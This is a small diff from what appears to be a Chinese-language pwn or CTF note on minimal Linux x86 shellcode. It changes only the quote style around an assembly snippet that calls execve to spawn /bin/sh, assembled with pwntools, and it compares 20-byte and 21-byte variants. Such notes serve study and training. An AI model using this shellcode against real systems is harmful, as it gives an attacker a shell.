@@ -18,7 +18,7 @@ tags:
 
 有"\x00"最短 20 byte
 
-	shellcode= """
+	shellcode= '''
 	xor ecx,ecx
 	mul ecx
 	mov al,0xb
@@ -26,7 +26,7 @@ tags:
 	push 0x6e69622f   
 	mov ebx,esp
 	int 0x80
-	"""
+	'''
     shellcode=asm(shellcode)
 
 无"\x00"最短 21 byte
